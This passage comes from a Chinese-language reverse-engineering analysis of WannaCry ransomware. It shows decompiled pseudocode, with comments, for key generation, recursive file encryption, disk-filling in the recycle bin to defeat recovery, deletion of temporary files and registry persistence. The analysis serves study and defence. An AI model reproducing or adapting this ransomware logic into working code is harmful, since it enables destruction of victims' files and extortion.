wcsrchr(&amp;Filename, &#x27;&#x27;) ) *wcsrchr(&amp;Filename, &#x27;&#x27;) = 0; // 获取到字符串-&gt;.wcry.exe SetCurrentDirectoryW(&amp;Filename); if ( !ReadFileToMem(&amp;c_wnryBase, 1) ) // 读取c.wnry到内存 return 0; StartIsSuccess = GetUsersidAndCmp(); // 获取当前用户的SID并与系统的SID作比较 if ( !GetApis() ) // 获取必要的API函数地址 return 0; sprintf(FileName_0, a08xRes, 0); // Dest=00000000.res sprintf(FileName, a08xPky, 0); // FileName=00000000.pky sprintf(buff, a08xEky, 0); // buff=00000000.eky if ( SetAccessControl(0) || sub_10004500(0) ) // 1.设置访问控制属性 2.判断是否存在00000000.pky这个文件 由于不存在 直接return &#123; hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartExeAndSetReg,0, 0, 0);// 条件不成立 跳过这个if分支 隐藏分支待分析 WaitForSingleObject(hThread, 0xFFFFFFFF); CloseHandle(hThread); return 0; &#125; lpAddress = (char)operator new(0x28u); // 申请一块内存空间 v14 = 0; if ( lpAddress ) v3 = InitializeCriSection(lpAddress); // 初始化临界区 elsev3 = 0; v14 = -1; if ( !v3 || !CreatePkyAndEky(v3, FileName, buff) )// 创建00000000.pky和00000000.eky 一个是公钥 一个是加密后的私钥 return 0; if ( !OpenResFile() || dword_1000DC70 ) // 打开00000000.res文件 &#123; DeleteFileA(FileName_0); memset(&amp;RandomBytes, 0, 0x88u); dword_1000DC70 = 0; GetRandom((HCRYPTPROV)v3, &amp;RandomBytes, 8u);// 获取0x8个字节的随机数 &#125; DestoryHandle(v3); ((void (__thiscall )(char , signed int))v3)(v3, 1);//隐藏函数 用于释放临界区 hThread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CreateResFile, 0, 0, 0);// 创建00000000.res文件 if ( hThread_1 ) CloseHandle(hThread_1); Sleep(100u); hThread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckDky, 0, 0, 0);// 每隔五秒检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return if ( hThread_2 ) CloseHandle(hThread_2); Sleep(100u); hThread_3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptAllFiles, 0, 0, 0);// 加密所有文件 Sleep(100u); hThread_4 = CreateThread(0, 0, StartTaskdl, 0, 0, 0);// 每隔三秒以隐藏的方式启动taskdl.exe if ( hThread_4 ) CloseHandle(hThread_4); Sleep(100u); hThread_5 = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)StartExeAndSetReg, 0, 0, 0);// 每隔三秒 启动taskse.exe和@WanaDecryptor@.exe并且修改注册表 if ( hThread_5 ) CloseHandle(hThread_5); Sleep(100u); RepeatOperation(); // 创建批处理脚本加密器 Read_Me@.txt 加密其他用户下的文件 if ( hThread_3 ) &#123; WaitForSingleObject(hThread_3, INFINITE); CloseHandle(hThread_3); &#125; return 0; &#125; Dll 文件主题包括了病毒的所有操作： 初始 临界区，缓冲区，路径，字符串并将c.wnry读到内存 建立 公钥，私钥文件，并加密所有文件 每隔三秒 隐藏方式启动 taskdl.exe taskse.exe 等文件 创建批处理脚本 加密器 Read_Me@.txt 加密其他用户下的文件 6.1.2 GetUsersidAndCmp 获取当前用户SID并与系统的SID作比较123456memset(&amp;v4, 0, 0x254u); // 将buff缓冲区清零 if ( GetCurrentUserSID(&amp;Buffer) ) // 获取当前用户的SID &#123; v0 = wcsicmp(aS1518, &amp;Buffer); // 比较当前的SID是否是S-1-5-18-&gt;系统的SID &#125; 从注册表中获取到当前用户的SID并于系统的SID做比较 6.1.3 CreatePkyAndEky 创建 pky 和 eky 文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546if ( !GetCSPHandle((char) this) ) // 获取CSP服务程序句柄 &#123; DestoryHandle(v3); // 如果失败则释放资源 return 0; &#125; if ( lpFileName ) &#123; if ( !ImportPubKey(v3, lpFileName) ) // 当00000000.pky不存在时 条件成立 &#123; if ( !CryptImportKey_Addr(v3[1], &amp;pbData, 0x114, 0, 0, v3 + 3)// 导入RSA公钥 || !CryptGenKey(v3[1], (int)(v3 + 2)) // 生成可导出的2048位RSA签名密钥 || !CreatePkyFile(v3[1], v3[2], 6u, lpFileName) )// 创建00000000.pky文件 并写入生成的RSA公钥 &#123; goto LABEL_19; &#125; if ( pky_str ) CreateEkyFile((int)v3, pky_str); // 创建00000000.eky文件 并写入加密后的RSA私钥 if ( !ImportPubKey(v3, lpFileName) ) // 导入00000000.pky的公钥 &#123; BEL_19: DestoryHandle(v3); // 如果导入失败释放句柄 return 0; &#125; &#125; v5 = v3[3]; // 当00000000.pky存在时 直接退出函数 这个函数在当前路径里创建 pky 和 eky文件， pky为公钥，eky为加密后的私钥 6.1.4 CreateResFile 线程回调+创建 res 文件1234567891011121314151617181920212223242526272829303132void __stdcall __noreturn CreateResFile(LPVOID lpThreadParameter) &#123; signed int index; // esi while ( !dword_1000DD90 ) &#123; SystemTime = time(0); // 返回当前系统时间 CreateRes(); // 创建并写入00000000.res文件 index = 0; do // 休眠22秒 &#123; if ( dword_1000DD90 ) goto LABEL_6; Sleep(1000u); ++index; &#125; while ( index &lt; 0x19 ); &#125; LABEL_6: ExitThread(0); // 退出线程 &#125; 在当前工作路径创建了 res 文件，并往里写数据： 写入了 0x8个字节的随机数 和 0x4 个字节的当前时间 6.1.5 CheckDky 线程回调+检测文件存在与否12345678910111213141516171819202122void __stdcall __noreturn CheckDky(LPVOID lpThreadParameter) &#123; while ( 1 ) &#123; dword_1000DD8C = sub_10004500((int)lpThreadParameter); // 检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return if ( dword_1000DD8C ) break; Sleep(5000u); &#125; ExitThread(0); &#125; 每隔5秒检测时候存在 dky 文件，存在就 引入 公钥并 进行 加解密操作 6.2 EncrypteAllFiles 线程回调+加密 (Important) 作为病毒的核心函数嵌套了，里外嵌套了很多层 6.2.1 第一层1234567891011121314151617Drives = GetLogicalDrives(); // 获取驱动中所有磁盘 if ( !dword_1000DD8C ) &#123; while ( 1 ) &#123; Sleep(3000u); Drives_1 = Drives; Drives = GetLogicalDrives(); if ( Drives != Drives_1 ) // 检测是否有新的磁盘加入 循环检测是否有新的磁盘加入，有就加密，没有就一直循环 6.2.2 第二层1234567891011121314151617181920212223242526272829303132333435DWORD __stdcall sub_10005680(LPVOID Num_3) &#123; char Parameter; // [esp+0h] [ebp-930h] int v3; // [esp+92Ch] [ebp-4h] InitCritical(&amp;Parameter); // 初始化临界区 v3 = 0; if ( MovFileToTemp(&amp;Parameter, FileName, (int)sub_10005340, (int)&amp;dword_1000DD8C) )// 移动文件到临时目录下并重命名为.WNCRTY &#123; EncryptFile((int)&amp;Parameter, (LONG)Num_3, 0);// 加密磁盘上的所有文件 FillDisk((int)Num_3); // 在回收站创建一个文件 并且循环写入数据直到磁盘空间不足 ReleaseResouce(&amp;Parameter); // 释放资源 ExitThread(0); &#125; v3 = -1; DeleteCritical(&amp;Parameter); // 释放临界区 return 0; &#125; 第二层中有三个比较重要的函数，起到了防止恢复软件对删除文件进行恢复等作用 6.2.2.1 MoveFileToTemp 移动文件并重命名1234567891011121314151617181920212223242526272829303132result = (HGLOBAL)CreatePkyAndEky((_DWORD *)lpParameter + 1, lpFileName, 0);// 创建00000000.pky和00000000.eky文件 此时文件已存在 直接退出函数 if ( result ) &#123; if ( lpFileName ) // lpFileName=00000000.pky CreatePkyAndEky((_DWORD *)v4 + 11, 0, 0); // 再一次检测是否存在这两个文件 result = GlobalAlloc(0, 0x100000u); // 申请0x10000大小的空间 *((_DWORD *)v4 + 0x132) = result; if ( result ) &#123; result = GlobalAlloc(0, 0x100000u); // 再次申请0x10000大小的空间 *((_DWORD *)v4 + 0x133) = result; if ( result ) &#123; InitializeCriticalSection((LPCRITICAL_SECTION)(v4 + 1260)); *((_DWORD *)v4 + 310) = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v4, 0, 0);// 将文件移动到临时目录下并重命名为WNCRTY 该函数单独创建了一个线程 将一部分文本文件移动到临时目录并重命名 值得注意的是，这时文件并没有进行加密，是可以直接通过修改后缀名修复的 6.2.2.2 FillDisk 回收站循环写入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107void *__cdecl FillDisk(int Num_3) &#123; hGlobal = (void *)GetDriveTypeW(RootPathName);// 获取磁盘类型 if ( hGlobal == (void *)DRIVE_FIXED ) // 如果是固定磁盘 &#123; hGlobal = GlobalAlloc(0, 0xA00000u); // 申请0xA00000大小的固定空间 hGlobal_1 = hGlobal; if ( hGlobal ) &#123; memset(hGlobal, 0x55u, 0xA00000u); // 将申请的空间全部初始化为5 FileName = 0; memset(&amp;v12, 0, 0x204u); v13 = 0; DeleteRecycleFile(Num_3, &amp;FileName); // 删除$RECYCLE的hibsys.WNCRYT文件 hFile = CreateFileW(&amp;FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);// 在$RECYCLE下创建一个hibsys.WNCRYT 属性为隐藏 if ( hFile == (HANDLE)-1 ) &#123; hGlobal = GlobalFree(hGlobal_1); // 创建失败直接释放空间 &#125; else &#123; MoveFileExW(&amp;FileName, 0, MOVEFILE_DELAY_UNTIL_REBOOT);// 在系统下次重新启动时正式进行移动文件操作 if ( !dword_1000DD8C ) &#123; LABEL_6: if ( GetDiskFreeSpaceExW( // 获取D盘的剩余空间的大小 确保空间足够 RootPathName, &amp;FreeBytesAvailableToCaller, &amp;TotalNumberOfBytes, &amp;TotalNumberOfFreeBytes) &amp;&amp; TotalNumberOfFreeBytes.QuadPart &gt; 0x40000000 ) &#123; index = 0; while ( WriteFile(hFile, hGlobal_1, 0xA00000u, &amp;NumberOfBytesWritten, 0) )// 将0xA00000个字节的5写入到hibsys.WNCRYT &#123; Sleep(0xAu); if ( (unsigned int)++index &gt;= 20 )// 循环写入20次 &#123; Sleep(10000u); if ( !dword_1000DD8C ) goto LABEL_6; // 当磁盘剩余空间不足时跳出循环 break; &#125; &#125; &#125; &#125; GlobalFree(hGlobal_1); // 释放申请的内存 FlushFileBuffers(hFile); // 刷新文件缓冲区 CloseHandle(hFile); hGlobal = (void *)DeleteFileW(&amp;FileName);// 删除临时目录文件夹下的hibsys.WNCRYT &#125; &#125; &#125; return hGlobal; &#125; 这个函数 会在 $RECYCLE 下创建一个名为 hibsys.WNCRYT 的文件并设置属性为隐藏，并循环往这个文件写入数据，知道磁盘空间不足 在我们的测试环境下，这个文件已经达到了 39个G 6.2.2.3 EncryptFile 加密磁盘上的所有文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071if ( a3 ) // 条件不成立 &#123; uDriveType = GetDriveTypeW; // 获取磁盘类型 if ( GetDriveTypeW(DirectoryName) == DRIVE_CDROM )// 如果是CD驱动器直接返回 return; InterlockedExchange(&amp;Target, Value); // 交换两个数 goto LABEL_12; &#125; if ( InterlockedExchangeAdd(&amp;Target, 0) != Value )// 用于对一个32位数值执行加法的原子操作 &#123; v3 = 0; while ( !GetDiskFreeSpaceExW( // 获取D盘的空余容量 如果失败直接返回 DirectoryName, &amp;FreeBytesAvailableToCaller, &amp;TotalNumberOfBytes, &amp;TotalNumberOfFreeBytes) || !TotalNumberOfBytes.QuadPart ) &#123; Sleep(1000u); if ( ++v3 &gt;= 30 ) return; &#125; uDriveType = GetDriveTypeW; if ( GetDriveTypeW(DirectoryName) != DRIVE_CDROM )// 获取磁盘类型 &#123; LABEL_12: if ( uDriveType(DirectoryName) == DRIVE_FIXED )// 如果磁盘类型是固定磁盘 &#123; lpPath = 0; memset(&amp;v11, 0, 0x204u); v12 = 0; GetRecyclePathOrTempPath(Value, &amp;lpPath);// 获取C盘下临时文件和回收站路径 GetFilePath((wchar_t *)Path, &amp;lpPath); //获取文件路径D:$RECYCLE0.WNCRYT &#125; LOWORD(v6) = 0; CoreEncryptFun((const wchar_t *)Path, DirectoryName, 1);// 核心函数 加密操作 该函数主体仍是加密文件之前的预处理部分，涉及具体的加密过程要进入CoreEncryptFun 函数进行分析。 6.2.3 第三层TraverseAndEncryptFiles(v3, DirectoryName, (int)&amp;v15, -1, a3);// 遍历所有文件 并且加密 第三层主要就是递归调用这个加密函数并对所有要加密文件进行遍历，下面我们继续深入 6.2.4 第四层123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159FileKind = FilterPostFix(FindFileData.cFileName);// 对后缀进行过滤 返回值为1说明是exe或dll 2说明是文本文件或者图片 v48 = FileKind; if ( FileKind != (wchar_t *)6 // 如果后缀为.WNCRY直接跳过 &amp;&amp; FileKind != (wchar_t *)1 // 如果是exe和dll直接跳过遍历下一个文件 &amp;&amp; (FileKind || FindFileData.nFileSizeHigh &gt; 0 || FindFileData.nFileSizeLow &gt;= 0xC800000) ) &#123; wcsncpy(&amp;TaegetFileName, FindFileData.cFileName, 0x103u);// 将文件名拷贝到目标内存 wcsncpy(&amp;TargetFileFullPath, &amp;String, 0x167u);// 将完整路径拷贝到目标内存 dwFileSizeHigh = FindFileData.nFileSizeHigh; dwFileSizeLow = FindFileData.nFileSizeLow; sub_10003760(&amp;v32, &amp;v36, v33, &amp;TargetFileFullPath);// 这个函数会操作容器将容器的计数+1 &#125; &#125; &#125; &#125; &#125; &#125; hFile = hFindFile; &#125; while ( FindNextFileW(hFindFile, &amp;FindFileData) );// 查找下一个文件 FindClose(hFile); for ( i = *(wchar_t )v33; i != v33; i = *(wchar_t )i )// 循环加密所有的文件 &#123; if ( !EncryptAllFile(v5, i + 4, 1) ) // 加密所有文件 sub_10003760((_DWORD *)a3, &amp;v36, *(_DWORD )(a3 + 4), i + 4); &#125; v14 = a4; if ( a4 == -1 ) &#123; v15 = Format; v14 = 0; if ( wcsnicmp(Format, asc_1000CC14, 2u) ) v14 = 1; else v15 = Format + 2; v16 = *v15; for ( j = v15; v16; ++j ) &#123; if ( v16 == 92 ) ++v14; v16 = j[1]; &#125; &#125; if ( v14 &lt;= 6 &amp;&amp; v34 &gt; 0 ) &#123; CopyReadMeTxt(Format); // 将@Please_Read_Me@.txt 拷贝到D盘下 if ( v14 &gt; 4 ) CopyWanaDecryptor_0(Format); // 将@WanaDecryptor@.exe拷贝到D盘 else CopyWanaDecryptor(Format); // 将@WanaDecryptor@.exe拷贝到D盘 &#125; v18 = v30; if ( a5 ) &#123; v19 = *(_DWORD )v30; if ( *(void )v30 != v30 ) &#123; v20 = v14 + 1; do &#123; v21 = (wchar_t *)v19[3]; if ( !v21 ) v21 = (wchar_t *)`std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Nullstr&#x27;::`2&#x27;::_C; TraverseAndEncryptFiles((_DWORD *)v35, v21, a3, v20, a5);// 递归遍历文件 v19 = (_DWORD *)*v19; v18 = v30; &#125; while ( v19 != v30 ); &#125; &#125; v22 = v18; LOBYTE(v49) = 0; v23 = (_DWORD *)*v18; if ( (_DWORD *)*v18 != v18 ) &#123; do &#123; v24 = v23; v23 = (_DWORD *)*v23; DeleteAllocMem(&amp;v29, (int)&amp;v36, v24); // 释放所有申请的空间 该函数会首先遍历所有的文件，对文件和文件夹执行不同的操作并且对后缀名进行过滤，跳过@Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk，@WanaDecryptor@.bmp总结为枚举 6.2.5 第五层1234567891011121314151617181920212223242526272829303132333435363738394041424344454647enum FILE_TYPE &#123; FILE_TYPE_NULL = 0, FILE_TYPE_EXEDLL, FILE_TYPE_DOC, FILE_TYPE_DOCEX, FILE_TYPE_WNCRYT, //.wncryt FILE_TYPE_WNCYR, //.wncyr FILE_TYPE_WNCRY //.wncry &#125; int __thiscall EncryptAllFile(const wchar_t this, wchar_t TargetFileFullPath, int Num_1) &#123; const wchar_t this_1; // edi int result; // eax this_1 = this; switch ( sub_10002E70(TargetFileFullPath, Num_1) )// 根据返回值不同执行不同的操作 &#123; case 0: return 1; case 2: DeleteFileW_Addr(TargetFileFullPath); return 1; case 3: if ( EncryptFiles(this_1, TargetFileFullPath, 3) )// 加密文件 &#123; wcscat(TargetFileFullPath, WNCRT); wcscat(TargetFileFullPath + 360, WNCRT); ((_DWORD)TargetFileFullPath + 312) = 5; &#125; goto LABEL_5; case 4: // .jpg EncryptFiles(this_1, TargetFileFullPath, 4); result = 1; break; default: LABEL_5: result = 0; break; &#125; return result; &#125; 针对该函数的加密策略做一个总结： 在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理 枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件 cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR cmd=2, 删除.WNCRYT cmd=3, 加密链表中所有文件（移出链表） cmd=4, 加密可能剩余链表中的文件 虽然操作不同 但是加密函数是同一个 接下来再次进入EncryptFiles 6.2.6 第六层 pTargetPostFix = wcsrchr(&amp;NewTargetFileFullPath, ‘.’);// 获取文件后缀名 pTargetPostFix_1 = pTargetPostFix; if ( !pTargetPostFix ) { pTargetPostFix_2 = &NewTargetFileFullPath; goto LABEL_6; } IsWNCRY = wcsicmp(pTargetPostFix, WNCRT); // 将后缀名与WNCRY比较 pTargetPostFix_2 = pTargetPostFix_1; if ( IsWNCRY ) { LABEL_6: wcscat(pTargetPostFix_2, Source); // 字符串拼接 原后缀+.WNCRY goto LABEL_8; } wcscpy(pTargetPostFix_1, Source); LABEL_8: if ( GetFileAttributesW(&amp;NewTargetFileFullPath) != -1 || StartEncryptFiles((char *)v9, (int)OldTargetFileFullPath, &amp;NewTargetFileFullPath, Num_4) )// 开始加密文件 { if ( Num_4 == 4 ) sub_10002BA0(v9, OldTargetFileFullPath); result = 1; } else { DeleteFileW_Addr(&amp;NewTargetFileFullPath); result = 0; } return result; } 这个函数仍然是作为加密函数的准备工作，获取文件的后缀名，将后缀名和.WNCRY做比较，如果一致就不加密，然后将原后缀与.WNCRY做拼接，然后开始加密文件 6.2.7 第七层 if ( !GetFileSizeEx(hFile_1, &amp;FileSize) ) // 获取目标文件大小 { local_unwind2((int)&amp;ms_exc.registration, -1); return 0; } GetFileTime(hFile_1, &amp;CreationTime, &amp;LastAccessTime, &amp;LastWriteTime);// 获取文件时间 if ( ReadFile_Addr(hFile_1, &amp;lpBuffer, 8, &amp;lpNumberOfBytesRead, 0)// 读取0x8个字节的文件内容 &amp;&amp; !memcmp(&amp;lpBuffer, aWanacry, 8u) // 将0x8个字节与WANACRY!比较 1&lt;!-- --&gt; 读取文件前0x8个字节，与WNACRY！作比较 1&lt;!-- --&gt; SetFilePointer(hFile, 0, 0, 0); // 将文件指针重新设置到文件开头 if ( a4 == 4 ) { swprintf(&amp;String, (size_t)aSS, NewTargetFileFullPath, aT);// 拼接字符串 在原文件后加上.WNCRYT NewhFile = (void *)CreateFileW_Addr(&amp;String, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);// 创建文件 2．使用源文件名 + .WNCRYT 创建一个新的空的文件 if ( !EncryptDatas(v32, &amp;pbBuffer, 0x10u, (int)&amp;v17, (int)&amp;v20) )// 对数据进行加密 goto LABEL_39; sub_10005DC0(this_1 + 84, (int)&amp;pbBuffer, (int)off_1000D8D4, 16, 16); memset(&amp;pbBuffer, 0, 0x10u); if ( !WriteFile_Addr(NewhFile, aWanacry, 8, &amp;v35, 0)// 写入到创建的文件-&gt;WANACRY! || !WriteFile_Addr(NewhFile, &amp;v20, 4, &amp;v35, 0)// 写入到创建的文件-&gt;0x100 || !WriteFile_Addr(NewhFile, &amp;v17, v20, &amp;v35, 0)// 写入0x100个字节的加密数据到文件 || !WriteFile_Addr(NewhFile, &amp;a4, 4, &amp;v35, 0)// 写入0x4到文件 || !WriteFile_Addr(NewhFile, &amp;FileSize, 8, &amp;v35, 0) )// 写入0x081006到文件 1&lt;!-- --&gt; 将加密后的数据写入到新创建的文件中 1&lt;!-- --&gt; if ( !ReadFile_Addr(hFile_2, *((_DWORD *)this_1 + 306), 0x10000, &amp;lpNumberOfBytesRead, 0) || lpNumberOfBytesRead != 0x10000 ) // 读取目标文件 { 21: local_unwind2((int)&amp;ms_exc.registration, -1); return 0; } sub_10006940((int)(this_1 + 84), *((_DWORD *)this_1 + 306), *((char )this_1 + 307), 0x10000u, 1); if ( WriteFile_Addr(NewhFile, *((_DWORD *)this_1 + 307), 0x10000, &amp;v35, 0) &amp;&amp; v35 == 0x10000 )// 将加密后的内容写入到新文件 1&lt;!-- --&gt; 读取源文件，并将加密后的内容写入到新创建的文件中 到此为止，加密函数的分析已经完成 6.3 剩余函数分析这部分我们将对 t.wnry.dll 中剩余的函数进行逐一的分析 6.3.1 StartTaskdl 线程回调+隐藏启动taskdl.exe if ( !CreateProcessA(0u, lpCommandLine, 0u, 0u, 0, 0x8000000u, 0u, 0u, &amp;StartupInfo, &amp;ProcessInformation) )// 创建Taskdl.exe进程 该函数每隔3秒会以隐藏的方式启动 taskdl.exe 6.3.2 StartExeAndSetReg线程回调+启动taskse.exe和@WanaDecryptor@.exe)+修改注册表 123456789101112131415ReadFileToMem(&amp;c_wnryBase, 0); // 读取c.wnry的内容到内存 &#125; StartTaskseAndDecryptor(); // 启动taskse.exe和@WanaDecryptor@.exe if ( v1 ) &#123; GetFullPathNameA(aTaskscheExe, 0x208u, &amp;Buffer, 0);// C:UsersDingisoDesktoptasksche.exe SetRegRun((int)&amp;Buffer); // 设置注册表启动项 该函数每隔三秒启动taskse.exe 和 @WanaDecryptor@.exe 然后利用 CMD设置注册表启动项为 tasksche.exe 的绝对地址 6.3.3 RepeatOperation 重复操作12345678910111213141516171819202122232425if ( GetFileAttributesA(aFWnry) == -1 ) // 检测f.wnry是否存在 sub_100018F0(&amp;Parameter, 10, 100); if ( !CurrentTime ) &#123; CurrentTime = time(0); CreateRes(); // 写入0x8个字节到00000000.res sprintf(&amp;Dest, aSFi, NewFileName); // @WanaDecryptor@.exe fi StartTargetFile(&amp;Dest, 0x186A0u, 0); ReadFileToMem(&amp;c_wnryBase, 1); &#125; RunBat(); // 创建并启动批处理脚本 CreateReadMe(); // 创建@Please_Read_Me@.txt EncryptOtherUsersFiles((int)&amp;Parameter); // 加密windows剩余所有用户的文件 该函数有三个重要的函数，就不展开分析了，我在这里将把他们的逻辑表述清楚 RunBat():判断@WanaDecryptor@.exe.lnk是否存在，如果不存在就创建一个批处理脚本，将命令写入.bat脚本脚本作用为给@WanaDecryptor@.exe创建快捷方式） CreateReadMe():检测工作路径下是否存在 ReadMe不存在就从r.wnry中读取内容并写入 ReadMe EncryptOtherUsersFiles():获取Windows所有的用户名，判断是否与当前的有户名相同，不同就加密该用户的所有文件 7 taskdle.exe 病毒辅助文件分析1234567891011121314151617181920212223242526272829dwDrives = GetLogicalDrives(); // 获取系统中所有的磁盘 v5 = 0x19; do &#123; *(_DWORD *)RootPathName = dword_403060; v8 = dword_403064; RootPathName[0] = v5 + 65; if ( (dwDrives &gt;&gt; v5) &amp; 1 &amp;&amp; GetDriveTypeW(RootPathName) != 4 )//获取D盘类型 &#123; DeleteFile(v5); // 清空回收站和临时目录所有以.WNCRYT 结尾文件 Sleep(10u); &#125; --v5; &#125; while ( v5 &gt;= 2 ); taskdl 的代码量相比上面的其他文件小很多了，主要就是涉及删除文件的操作 7.1 DeleteFile 删除回收站和临时目录下的.WNCRY文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193int __cdecl DeleteFile(int a1) &#123; GetRecyclePathOrTempPath(a1, &amp;RecyclePath); &#x2F;&#x2F; 获取回收站路径或者C盘下的临时文件夹路径 swprintf(&amp;String, (size_t)aSS, &amp;RecyclePath, aWncryt);&#x2F;&#x2F; string&#x3D;回收站路径或临时文件夹路径+*.WNCRYT &#x2F;&#x2F; hFile &#x3D; FindFirstFileW(&amp;String, &amp;FindFileData);&#x2F;&#x2F;在回收站查找所有.WNCRYT结尾的文件 if ( hFile &#x3D;&#x3D; (HANDLE)-1 ) &#x2F;&#x2F; 如果没找到直接返回 &#123; v2 &#x3D; (char *)Memory; v24 &#x3D; -1; if ( Memory !&#x3D; v17 ) &#123; do &#123; std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::~basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;( v2, 0); v2 +&#x3D; 16; &#125; while ( v2 !&#x3D; v17 ); v2 &#x3D; (char *)Memory; &#125; FreeMem(v2); &#x2F;&#x2F; 释放内存 result &#x3D; 0; &#125; else &#123; do &#x2F;&#x2F; 如果找到了 &#123; swprintf(&amp;String, (size_t)aSS_0, &amp;RecyclePath, FindFileData.cFileName);&#x2F;&#x2F; 拼接目标文件的完整路径 v19 &#x3D; v13; &#x2F;&#x2F; 清空strings对象的内存 std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 0); TargetFullPathLen &#x3D; wcslen(&amp;String); &#x2F;&#x2F; 获取目标文件完整路径的长度 if ( (unsigned __int8)std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Grow( &amp;v19, TargetFullPathLen, 1) ) &#123; wmemcpy(TargetFullPath, &amp;String, TargetFullPathLen);&#x2F;&#x2F; 拷贝目标路径 std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Eos( &amp;v19, &#x2F;&#x2F; 将目标文件路径和长度写入到容器 TargetFullPathLen); &#125; LOBYTE(v24) &#x3D; 1; sub_4013D0(&amp;v15, (int)v17, 1u, (int)&amp;v19);&#x2F;&#x2F; 这个函数会把之前的String对象放到另一个容器里 LOBYTE(v24) &#x3D; 0; std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 1); &#125; while ( FindNextFileW(hFile, &amp;FindFileData) ); FindClose(hFile); &#x2F;&#x2F; 文件遍历结束 v5 &#x3D; 0; for ( i &#x3D; 0; ; i +&#x3D; 16 ) &#123; v7 &#x3D; (char *)Memory; if ( !Memory || v5 &gt;&#x3D; (v17 - (_BYTE *)Memory) &gt;&gt; 4 ) break; TargetFullPath_1 &#x3D; *(const WCHAR )((char *)Memory + i + 4); if ( !TargetFullPath_1 ) TargetFullPath_1 &#x3D; (const WCHAR *)&#96;std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Nullstr&#39;::&#96;2&#39;::_C; if ( DeleteFileW(TargetFullPath_1) ) &#x2F;&#x2F; 删除目标文件 ++v14; ++v5; &#125; v9 &#x3D; (char *)Memory; v10 &#x3D; v17; v11 &#x3D; (char *)Memory; if ( Memory !&#x3D; v17 ) &#123; do &#123; std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v11, 1); v11 +&#x3D; 16; &#125; while ( v11 !&#x3D; v10 ); v7 &#x3D; (char *)Memory; &#125; v17 &#x3D; v9; v24 &#x3D; -1; v12 &#x3D; v7; if ( v7 !&#x3D; v9 ) &#123; do &#123; &#x2F;&#x2F; 循环清空每一个容器里的内容 std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v12, 1); v12 +&#x3D; 16; &#125; while ( v12 !&#x3D; v9 ); v7 &#x3D; (char *)Memory; &#125; FreeMem(v7); &#x2F;&#x2F; 释放内存 result &#x3D; v14; &#125; return result; &#125; 首先，该函数利用了 GetRecyclePathOrTempPah 函数获得了 回收站D:/$RECYCLE 和系统盘历史文件夹的路径C:UsersDingisoAppDataLocalTemp 这两个地址 然后函数会循环两次，判断是否系统中存在其他的盘符。 接着函数利用FindFirstW函数查找目标文件夹中所有的以.WNCRYT结尾的文件 函数会将他遍历的所有的.WNCRYT文件的完整路径和长度存储到一个容器中 当文件遍历结束 会调用DeleteFileW 删除所有容器中记录的项 最后 循环将存放文件的完整路径和长度的容器清空 ，释放资源 8 taskse.exe 病毒辅助文件分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081signed int __cdecl sub_401000(int argv, int a2, __int16 Num_5, int Num_0) &#123; Advapi32Base = GetModuleHandleA(LibFileName); // 获取advapi32.dll句柄 if ( !Advapi32Base ) &#123; Advapi32Base = LoadLibraryA(LibFileName); // 加载advapi32.dll *kernel32Base = GetModuleHandleA(kernel32); if ( !kernel32Base ) &#123; kernel32Base = LoadLibraryA(kernel32); // 加载kernel32.dll if ( !kernel32Base ) return -1; &#125; hProcess = ((int (__stdcall *)(signed int, void ))GetCurrentProcess_Addr)(40, &amp;TokenHandle);// 获取当前进程的伪句柄 if ( !((int (__stdcall *)(int))OpenProcessToken_Addr)(hProcess) )// 以修改权限的方式 打开进程的令牌 goto LABEL_55; if ( !((int (__stdcall *)(_DWORD, char *, int 